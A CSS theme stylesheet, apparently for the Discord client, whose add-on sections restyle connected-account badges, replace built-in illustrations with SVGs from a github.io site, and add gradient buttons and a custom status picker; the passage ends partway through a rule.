/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Database |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Currently in development */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | Codeblock Icons |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Currently in development */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | Refined User Connections ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
    #app-mount .connectedAccount-36nQx7 {
        background-color: transparent;
        border: none;
    }
    #app-mount .connectedAccount-36nQx7 .connectedAccountNameInner-1phBvE::after {
        content: "";
        position: absolute;
        border-radius: 1px 3px 3px 1px;
        margin-left: -36px;
        height: 46px;
        width: 260px;
    }
    #app-mount .connectedAccountVerifiedIcon-3aZz_K svg path {
        fill: #fff;
        opacity: 0.4;
    }
    #app-mount .connectedAccountVerifiedIcon-3aZz_K .childContainer-1wxZNh svg path {
        opacity: 1;
    }
    #app-mount .connectedAccountIcon-3P3V6F,
    #app-mount .connectedAccountName-f8AEe2,
    #app-mount .connectedAccountNameInner-1phBvE span,
    #app-mount .connectedAccountNameInner-1phBvE + .anchor-3Z-8Bb {
        z-index: 1;
    }

    #app-mount .connectedAccountIcon-3P3V6F[alt="GitHub Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #24292E;
        box-shadow: -2px 0 0 0 #d9dadb;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Twitch Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #3a2b5f;
        box-shadow: -2px 0 0 0 #9059F6;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Steam Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #171A21;
        box-shadow: -2px 0 0 0 #3b587c;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Spotify Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #138139;
        box-shadow: -2px 0 0 0 #1ED760;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Twitter Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #0C5886;
        box-shadow: -2px 0 0 0 #76C5F5;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Reddit Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #81340e;
        box-shadow: -2px 0 0 0 #FF6314;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="YouTube Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #6d1616;
        box-shadow: -2px 0 0 0 #EE0F0F;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Battle.net Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #175266;
        box-shadow: -2px 0 0 0 #3AB1DA;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Xbox Live Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #1c632a;
        box-shadow: -2px 0 0 0 #77BB44;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Facebook Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #14223d;
        box-shadow: -2px 0 0 0 #3A5998;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="League of Legends Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #424491;
        box-shadow: -2px 0 0 0 #676AE6;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Skype Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #424491;
        box-shadow: -2px 0 0 0 #676AE6;
    }

    #app-mount .connectedAccountIcon-3P3V6F[alt="GitLab Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #8f2b1b;
        box-shadow: -2px 0 0 0 #FCA326;
    }
    #app-mount .connectedAccountIcon-3P3V6F[alt="Minecraft Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #2a4911;
        box-shadow: -2px 0 0 0 #70B237;
    }

    #app-mount .connectedAccountIcon-3P3V6F[alt="discord.bio Logo"] + .connectedAccountNameInner-1phBvE::after {
        background-color: #3d4870;
        box-shadow: -2px 0 0 0 #7289da;
    }
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | Discolored ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/* 🛩️ Airplane */
[style*='background-image: url("/assets/712a0fd4d14a1caadd31cb0745e91238.svg");'],
[style*='background-image: url("/assets/857c505aafbe092e4f6efecebcad0bc8.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/airplane.svg') !important;
}

/* 🕹️ Arcades */
[style*='background-image: url("/assets/d01c53acda73318e5b39676ef8242eb7.svg");'],
[style*='background-image: url("/assets/bb8e02d970950bdadb649d765f3b8488.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/arcades.svg') !important;
}

/* 🔨 Ban Hammer */
[style*='background-image: url("/assets/789de85a973b1d974a21aa03c1e14323.svg");'],
[style*='background-image: url("/assets/e3fb8fe698a871db1d0e34ededf8a954.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/ban_hammer.svg') !important;
}

/* 🔎💥 Broken magnifying glass */
.theme-dark .errorImage-12Q43V, .theme-light .errorImage-12Q43V {
    background-image: url('https://nyri4.github.io/Discolored/assets/broken.svg');
}

/* 🏰 Castle */
.theme-dark .verification-3RfWYC, .theme-light .verification-3RfWYC {
    background-image: url('https://nyri4.github.io/Discolored/assets/castle.svg');
}

/* ⚙️ Channel settings */
[src="/assets/bfffd518c76d3f6bc5e96eb52e4ae2cf.svg"],
[src="/assets/9ad4d437577c5569dc231a787a5377f6.svg"] {
    content: url('https://nyri4.github.io/Discolored/assets/channel_settings.svg');
}

/* 👥 🖼️ Community banner */
.theme-dark .avatarUploaderInnerSquare-2wsxgt, .theme-light .avatarUploaderInnerSquare-2wsxgt {
    background-image: url('https://nyri4.github.io/Discolored/assets/community_banner.svg');
}

/* 🖥️ Computer */
[style*='background-image: url("/assets/b47564b3086d0d8d941aae95a4b7b78c.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/computer.svg') !important;
}

/* 💥 Crash */
.theme-dark .image-3zK3Wt, .theme-light .image-3zK3Wt {
    background-image: url('https://nyri4.github.io/Discolored/assets/crash.svg');
}

/* 🎮 Developer Options */
[style*='background-image: url("/assets/59c726954bd8424f376ca3a7eedc4c54.svg");'],
[style*='background-image: url("/assets/fe5ef0f14b8d025d73465e2d76913e20.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/dev_options.svg') !important;
}

/* 😃 Emojis */
[style*='background-image: url("/assets/a7371de3223292c6f31f8aeed62f17c1.svg");'],
[style*='background-image: url("/assets/3236694e0c095adfbbd5334fc8dc7aa0.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/emojis.svg') !important;
}

/* 📭 Empty */
.theme-dark .image-3rvd0n, .theme-light .image-3rvd0n, .theme-dark .emptyImage-1ABqhB, .theme-light .emptyImage-1ABqhB {
    background-image: url('https://nyri4.github.io/Discolored/assets/empty.svg');
}

/* 😊 Friend */
.theme-dark .channelNotice-1-XFjC.invite-OjTXrW, .theme-light .channelNotice-1-XFjC.invite-OjTXrW {
    background-image: url('https://nyri4.github.io/Discolored/assets/friend.svg');
}

/* 🤷‍♂️ GIF not found */
.theme-dark .sadImage-2ph8SI, .theme-light .sadImage-2ph8SI {
    background-image: url('https://nyri4.github.io/Discolored/assets/gif_not_found.svg');
}

/* 🤷‍ GIF picker end */
.theme-dark .endContainer-1ZDW8j:after, .theme-light .endContainer-1ZDW8j:after {
    background-image: url('https://nyri4.github.io/Discolored/assets/gif_picker_end.svg');
}

/* 👥 Groups */
.theme-dark .noFriends-1fVUuM .errorStateIcon-3fNXE5, .theme-light .noFriends-1fVUuM .errorStateIcon-3fNXE55 {
    background-image: url('https://nyri4.github.io/Discolored/assets/groups.svg');
}

/* 🎁 Gift Inventory */
.theme-dark .emptyStateImage-2MrSNs, .theme-light .emptyStateImage-2MrSNs {
    background-image: url('https://nyri4.github.io/Discolored/assets/gift_inventory.svg');
}

/* 🏠 Houses */
.theme-dark .emptyIconGuilds-3OViNh, .theme-light .emptyIconGuilds-3OViNh {
    background-image: url('https://nyri4.github.io/Discolored/assets/houses.svg');
}

/* ✨ Integrations */
[src="/assets/36d0e0bb009fa362c2533003c0af67b5.svg"],
[src="/assets/c9b2eb9473c66578a8e021e9fe46b74b.svg"] {
    content: url('https://nyri4.github.io/Discolored/assets/integrations.svg');
}

/* 🔑 Key */
.theme-dark .channelNotice-1-XFjC.guildMFAWarning-3GEzs8, .theme-light .channelNotice-1-XFjC.guildMFAWarning-3GEzs8 {
    background-image: url('https://nyri4.github.io/Discolored/assets/key.svg');
}

/* 💎 Nitro */
[src="/assets/5a4ac7879fb43bc2509169b8fac68a4a.svg"] {
    content: url('https://nyri4.github.io/Discolored/assets/nitro.svg');
}

/* ⌨️ No keybinds */
.theme-dark .image-1GzsFd, .theme-light .image-1GzsFd {
    background-image: url('https://nyri4.github.io/Discolored/assets/no_keybinds.svg');
}

/* 🙁 No Mutuals */
.theme-dark .emptyIconFriends-BrjhY9, .theme-light .emptyIconFriends-BrjhY9 {
    background-image: url('https://nyri4.github.io/Discolored/assets/no_mutuals.svg');
    background-size: 100%;
}

/* 🔎 🗣️ No results conversation */
.theme-dark .emptyState-2gL-9T, .theme-light .emptyState-2gL-9T {
    background-image: url('https://nyri4.github.io/Discolored/assets/no_results_conv.svg');
    background-size: 20%;
}

/* 🔎 No results search bar*/
.theme-dark .noResultsImage-3Y0eCI, .theme-light .noResultsImage-3Y0eCI {
    background-image: url('https://nyri4.github.io/Discolored/assets/no_results.svg');
}

/* 📱 Phones */
.theme-dark .verificationBlock-1Chfpc .image-2LVZ_j.phone-27MBJz, .theme-light .verificationBlock-1Chfpc .image-2LVZ_j.phone-27MBJz {
    background-image: url('https://nyri4.github.io/Discolored/assets/phones.svg');
}

/* 🖼️ Pictures */
[style*='background-image: url("/assets/e9aaf1824f17126a7992e5ad98752389.svg");'],
[style*='background-image: url("/assets/fffa18d6d66a76c08c500c56afe68a62.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/pictures.svg') !important;
}

/* 📌 Pinned */
[style*='background-image: url("/assets/6793e022dc1b065b21f12d6df02f91bd.svg");'],
[style*='background-image: url("/assets/03c7541028afafafd1a9f6a81cb7f149.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/pinned.svg') !important;
}

/* 💩 Poo */
.theme-dark .imageError-2OefUi, .theme-light .imageError-2OefUi,
.theme-dark .invalidPoop-pnUbq7, .theme-light .invalidPoop-pnUbq7,
.theme-dark .guildIconExpired-2Qcq05, .theme-light .guildIconExpired-2Qcq05 {
    background-image: url('https://nyri4.github.io/Discolored/assets/poop.svg');
}

/* 📜 Scroll */
[style*='background-image: url("/assets/99253cefda98913b1e9f7d155ad81ed3.svg");'],
[style*='background-image: url("/assets/0049cd2d5d8dad87fac3811fa651988e.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/scroll.svg') !important;
}

/* 🔎 Searching */
.theme-dark .searchIndexBackground-HQa_J9, .theme-light .searchIndexBackground-HQa_J9 {
    background-image: url('https://nyri4.github.io/Discolored/assets/searching.svg');
}

/* 🔥 Server outage */
.theme-dark .art-clkMXs, .theme-light .art-clkMXs {
    background-image: url('https://nyri4.github.io/Discolored/assets/server_outage.svg');
}

/* 🟢 Spotify error */
.theme-dark .artworkSpotifySessionEnded-11d_If, .theme-light .artworkSpotifySessionEnded-11d_If {
    background-image: url('https://nyri4.github.io/Discolored/assets/spotify_error.svg');
}

/* 🔴 Streamer Mode */
.theme-dark .streamerModeEnabledImage-3vynUz, .theme-light .streamerModeEnabledImage-3vynUz {
    background-image: url('https://nyri4.github.io/Discolored/assets/streamer_mode.svg');
}

/* ↔️ Switch */
.theme-dark .channelNotice-1-XFjC.quickswitcher-35bYg4, .theme-light .channelNotice-1-XFjC.quickswitcher-35bYg4 {
    background-image: url('https://nyri4.github.io/Discolored/assets/switch.svg');
}

/* 📹 Test Video */
[src="/assets/aba3ec7874f7f01fe9a8275a3e5c21a0.svg"],
[src="/assets/baf6cccc846651d5ca897296163227f5.svg"] {
    content: url('https://nyri4.github.io/Discolored/assets/test_video.svg');
}

/* 🗝️ Treasure Chest */
[src="/assets/cdea41ede63f61153e4a3c0531fa3873.svg"],
[src="/assets/f8696a3854655998a24c219403420867.svg"] {
    content: url('https://nyri4.github.io/Discolored/assets/treasure_chest.svg');
}

/* 🎁 Unclaimed */
.theme-dark .imageUnclaimed-5nJyYs, .theme-light .imageUnclaimed-5nJyYs {
    background-image: url('https://nyri4.github.io/Discolored/assets/unclaimed.svg');
}

/* ⛏️ Wumpus Mining */
[style*='background-image: url("/assets/8c998f8fb62016fcfb4901e424ff378b.svg");'],
[style*='background-image: url("/assets/645df33d735507f39c78ce0cac7437f0.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/wumpus_mining.svg') !important;
}

/* 🗻 Wumpus Mountains */
[style*='background-image: url("/assets/b669713872b43ca42333264abf9c858e.svg");'],
[style*='background-image: url("/assets/c84361b810ca7c10d6e8ddb6ea722ebe.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/wumpus_mountain.svg') !important;
}

/* 💤 Wumpus Sleeping */
[style*='background-image: url("/assets/a12ff54c4c5c03b41006fd96a4709c29.svg");'],
[style*='background-image: url("/assets/d834d700306f3838c0facef39e7d8a38.svg");'] {
    background-image: url('https://nyri4.github.io/Discolored/assets/wumpus_sleeping.svg') !important;
}

/* 🍵 Wumpus Tea Party */
[style*='background-image: url("/assets/b5eb2f7d6b3f8cc9b60be4a5dcf28015.svg");'],
[style*='background-image: url("/assets/6b7098de4cc16f7e431ad8f9aae7f6db.svg");'],
.theme-dark .notFriends-SkjxV- .errorStateIcon-3fNXE5, .theme-light .notFriends-SkjxV- .errorStateIcon-3fNXE5 {
    background-image: url('https://nyri4.github.io/Discolored/assets/wumpus_tea_party.svg') !important;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | GradientButtons |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
    :root {
        /* Gradients */
        --default-gradient: 315deg, #495DA4 0%, #7289DA 74%;
        --special-gradient: 315deg, #8980F0 0%, #D577F0 74%;
        --red-gradient: 315deg, #AA3738 0%, #F04747 74%;
        --yellow-gradient: 315deg, #C2831B 0%, #FFB740 74%;
        --green-gradient: 315deg, #264D41 0%, #43B581 74%;
        --grey-gradient: 315deg, #373A45 0%, #747F8D 74%;
        --white-gradient: 315deg, rgba(255, 255, 255, 0.2) 0%, rgba(255, 255, 255, 0) 74%;
        /* Transitions */
        --font-normal: 500;
        --font-hover: bold;
        --font-size-hover: 15px;
        --hover-transition: 0.1s linear;
        --transform-normal: scale(1);
        --hover-transform: scale(1.15);
        --setting-hover-transform: scale(1.025);
        --button-hover-transform: scale(1.03);
    }

    #app-mount .menu-3sdvDG .item-1tOPte:not(#user-context-user-volume) {
        font-weight: var(--font-normal);
        transition: var(--hover-transition);
    }
    #app-mount .menu-3sdvDG .item-1tOPte:not(#user-context-user-volume).focused-3afm-j,
    #app-mount .menu-3sdvDG .item-1tOPte:not(#user-context-user-volume):active {
        font-size: var(--font-size-hover);
        font-weight: 600;
    }
    #app-mount .wrapper-2aW0bm .button-1ZiXG9 img,
    #app-mount .wrapper-2aW0bm .button-1ZiXG9 svg {
        transform: var(--transform-normal);
        transition: var(--hover-transition);
    }
    #app-mount .wrapper-2aW0bm .button-1ZiXG9:hover img,
    #app-mount .wrapper-2aW0bm .button-1ZiXG9:hover svg {
        transform: var(--hover-transform);
        color: #fff;
    }
    #app-mount .wrapper-2aW0bm .button-1ZiXG9:not(.dangerous-2r8KxV):hover {
        color: #fff;
    }
    #app-mount .wrapper-2aW0bm .button-1ZiXG9.dangerous-2r8KxV:hover {
        color: #fff;
    }

    #app-mount .wrapper-1BJsBx .childWrapper-anI2G9 .homeIcon-tEMBK1 {
        transform: var(--transform-normal);
        transition: var(--hover-transition);
    }
    #app-mount .wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9 .homeIcon-tEMBK1 {
        transform: var(--hover-transform);
    }

    #app-mount .side-8zPYf6 .item-PXvHYJ {
        transform: var(--transform-normal);
        transition: var(--hover-transition);
        font-size: 13px;
    }
    #app-mount .side-8zPYf6 .item-PXvHYJ:hover {
        transform: var(--setting-hover-transform);
    }
    #app-mount .side-8zPYf6 .item-PXvHYJ[aria-controls="Discord Nitro-tab"]:active,
    #app-mount .side-8zPYf6 .item-PXvHYJ[aria-controls="Discord Nitro-tab"][aria-selected=true],
    #app-mount .side-8zPYf6 .item-PXvHYJ[aria-controls=GUILD_PREMIUM-tab]:active,
    #app-mount .side-8zPYf6 .item-PXvHYJ[aria-controls=GUILD_PREMIUM-tab][aria-selected=true] {
        color: #fff;
    }
    #app-mount .lookFilled-1Gx00P {
        transform: var(--transform-normal);
        transition: 0.15s linear;
    }
    #app-mount .lookFilled-1Gx00P:hover {
        transform: var(--button-hover-transform);
    }
    #app-mount .lookFilled-1Gx00P.buttonColor-7qQbGO.disabled-158sUq:hover {
        transform: var(--transform-normal);
    }
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | GameStatus ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6:nth-child(3) > button.button-14-BFJ.enabled-2cQ-u7.button-38aScr.lookBlank-3eh9lL.colorBrand-3pXr91.grow-q77ONN:nth-child(4) {
padding-left: 6px;
}
.button-14-BFJ.enabled-2cQ-u7:hover .contents-18-Yxp.btn-gamestatus {
filter: brightness(165%);
}
#app-mount > div:nth-child(10).layerContainer-yqaFcK .tooltipContent-bqVLWK {
width: 99px;
bottom: 75px !important;
z-index: 99999999999 !important;
}
#app-mount > div:nth-child(10).layerContainer-yqaFcK .tooltip-2QfLtc {
width: 99px;
bottom: 75px !important;
z-index: 99999999999 !important;
}
#app-mount > div:nth-child(10).layerContainer-yqaFcK .tooltipPointer-3ZfirK {
width: 400px;
bottom: 75px !important;
z-index: 99999999999 !important;
}
#app-mount > div:nth-child(10).layerContainer-yqaFcK {
bottom: 75px !important;
z-index: 99999999999 !important;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | Status Picker+ ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
div#status-picker-custom-status > .statusItem-33LqPf {
    display: grid !important;
    margin-top: 20px !important;
    margin-left: 10px !important;
    bottom: 89px !important;
    left: 86px !important;
    position: fixed !important;
    background-color: var(--custom-status-bg) !important;
    border-radius: var(--border-radius) !important;
    width: 216px !important;
    transition: all 300ms !important;
    font-size: 14px;
}
:root {
        --avatar-gap-bg: var(--background-secondary);
        --avatar-height: 33px;
        --avatar-width: 79px;
        --menu-bg: var(--background-tertiary);
        --custom-status-bg: var(--background-secondary-alt);
        --border-radius: 3px;
        --online: #43b581;
        --online-hover: rgb(67, 182, 131, 0.5);
        --idle: #faa61a;
        --idle-hover: rgb(250, 166, 26, 0.5);
        --dnd: #f04747;
        --dnd-hover: rgb(240, 71, 71, 0.5);
        --invisible: #747f8d;
        --invisible-hover: rgb(116, 127, 141, 0.5);
    }
    @keyframes StatusPicker {
        0% {
            transform: translateY(5px);
            opacity: 0;
        }
        100% {
            transform: none;
            opacity: 1;
        }
    }
    @keyframes StatusPickerAvatar {
        0% {
            transform: translateY(5px) translateX(-50%);
            opacity: 0;
        }
        100% {
            transform: translateX(-50%);
            opacity: 1;
        }
    }
    #app-mount .scale-3iLZhb {
        opacity: 1;
        transform: none;
    }
    #app-mount #status-picker {
        background: radial-gradient(circle at center 45px, var(--avatar-gap-bg) 34px, var(--menu-bg) 0);
        border-radius: var(--border-radius);
        box-shadow: 0 0 8px rgba(0, 0, 0, 0.5);
        margin-bottom: 3px;
        width: 224px;
        height: 200px;
        animation: StatusPicker 350ms ease forwards;
    }
    #app-mount #status-picker .scroller-3BxosC {
        position: absolute;
        display: flex;
        margin-top: 20px;
        margin-left: 10px;
        width: 94%;
        bottom: 42px;
        left: 15px;
    }
    #app-mount #status-picker .scroller-3BxosC::-webkit-scrollbar {
        display: none;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) {
        background-color: transparent;
        padding: 0;
        margin: 0 5px;
        width: 25px;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) .status-1fhblQ, #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) .description-2L932D {
        display: none;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status)#status-picker-online {
        --status-color: var(--online);
        --status-color-hover: var(--online-hover);
        margin-left: -8px;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status)#status-picker-idle {
        --status-color: var(--idle);
        --status-color-hover: var(--idle-hover) ;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status)#status-picker-dnd {
        --status-color: var(--dnd);
        --status-color-hover: var(--dnd-hover) ;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status)#status-picker-invisible {
        --status-color: var(--invisible);
        --status-color-hover: var(--invisible-hover);
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) .status-1AY8sU {
        background-color: var(--status-color) !important;
        transition: all 300ms;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status):hover .status-1AY8sU, #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status).focused-3afm-j .status-1AY8sU {
        background-color: var(--status-color-hover) !important;
    }
    #app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) .statusItem-33LqPf svg {
        width: 25px;
        height: 25px;
background-color: transparent;
    }
    #app-mount #status-picker .scroller-3BxosC #status-picker-custom-status {
        position: fixed;
        background-color: var(--custom-status-bg);
        border-radius: var(--border-radius);
        margin-top: 40px;
        margin-left: -39px;
        width: 216px;
        transition: all 300ms;

    }
    #app-mount #status-picker .scroller-3BxosC #status-picker-custom-status:hover, #app-mount #status-picker .scroller-3BxosC #status-picker-custom-status.focused-3afm-j {
        background-color: #5C6FB1;
    }

    #app-mount .container-3baos1 {
        position: relative;
    }
    #app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true] {
        height: var(--avatar-height);
        width: var(--avatar-width);
    }
    #app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true] .avatar-SmRMf2 {
        z-index: 1003;
        position: absolute;
        pointer-events: none;
        height: 60px !important;
        width: 60px !important;
        bottom: 156px;
        left: 50%;
        animation: StatusPickerAvatar 350ms ease forwards;
    }
    #app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true] .avatar-SmRMf2 foreignObject {
        -webkit-mask: none;
                mask: none;
        border-radius: 25px;
    }
    #app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true] .avatar-SmRMf2 rect {
        display: none;
    }
.layerContainer-yqaFcK {
z-index: 999;
}
.separator-2I32lJ {
margin: unset;
}
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O) {
    position: static;
}
.status-1fhblQ {
    color: #b9bbbe;
    font-size: smaller;
}
.statusItem-33LqPf:hover .status-1fhblQ {
color: white;
}
#app-mount #status-picker .scroller-3BxosC .item-1tOPte:not(#status-picker-custom-status) {
position: static;
}
.scroller-3BxosC {
width: 150px !important;
left: 25px !important;
}
.statusItem-33LqPf {
    margin-left: 0px;
}
div#status-picker-invisible.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(5) {
            visibility: hidden;
}
div#status-picker-dnd.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(4) {
            visibility: hidden;
}
div#status-picker-online.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(1) {
            visibility: hidden;
}
div#status-picker-idle.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(3)  {
            visibility: hidden;
}
div#status-picker-dnd.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(4) > div.statusItem-33LqPf  {
visibility: visible;
}
div#status-picker-idle.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(3) > div.statusItem-33LqPf  {
visibility: visible;
}
div#status-picker-online.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(1) > div.statusItem-33LqPf  {
visibility: visible;
}
div#status-picker-invisible.item-1tOPte.colorDefault-2K3EoJ.focused-3afm-j:nth-child(5) > div.statusItem-33LqPf {
visibility: visible;
}
div.content-3BhRLj:nth-child(2) > div.wrapper-3nSjSv:nth-child(10) > h3.heading-4znNKq.base-1x0h_U.size24-RIRrxO:nth-child(1) {
color: white;
}
div#app-mount.appMount-3lHmkl:nth-child(1) > div.layerContainer-yqaFcK:nth-child(8) > div#popout_2.layer-v9HyYc > div.animatorBottom-fS5rNO.scale-3iLZhb.didRender-33z1u8 > div#guild-header-popout.menu-3sdvDG.styleFixed-sX-yHV > div#status-picker-account.item-1tOPte:nth-child(3) {
    margin-bottom: 0px !important;
    visibility: hidden !important;
    position: absolute !important;
    font-size: 0px !important;
    margin-left: 9999px;
    color: var(--background-floating) !important;
    transition: all 0s, background-color 0s, margin-left 0s
}
@keyframes fadeIn {
  0% {
    opacity:0;
  }
99.99% {
    opacity:0;
  }
  100% {
    opacity:1;
  }
}
div#status-picker-custom-status > .statusItem-33LqPf .status-1fhblQ {
    transition: 0.2s ease-in-out, background-color 0.1s ease-in-out, margin-left 4s ease-in-out;
    flex: 1 1 auto;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    animation: fadeIn 0.4s;
}
div#status-picker-custom-status > .statusItem-33LqPf:hover .status-1fhblQ {
   padding-left: 3px;
   font-weight: bold;
   color: white;
}
.customEmojiPlaceholder-37iZ_j {
    animation: fadeIn 0.4s;
    background-size: 16px;
    height: 24px !important;
    width: 24px !important;
    background-position-y: center;
    border-top-right-radius: 30px;
    border-bottom-right-radius: 30px;
    border-top-left-radius: 100px;
    border-bottom-left-radius: 100px;
    margin-top: 0px;
    transition: 0.2s ease-in-out, background-size 0.2s ease-in-out, background-color 0.1s ease-in-out;
}
div#status-picker-custom-status > .statusItem-33LqPf:hover .customEmojiPlaceholder-37iZ_j {
    background-size: 21px;
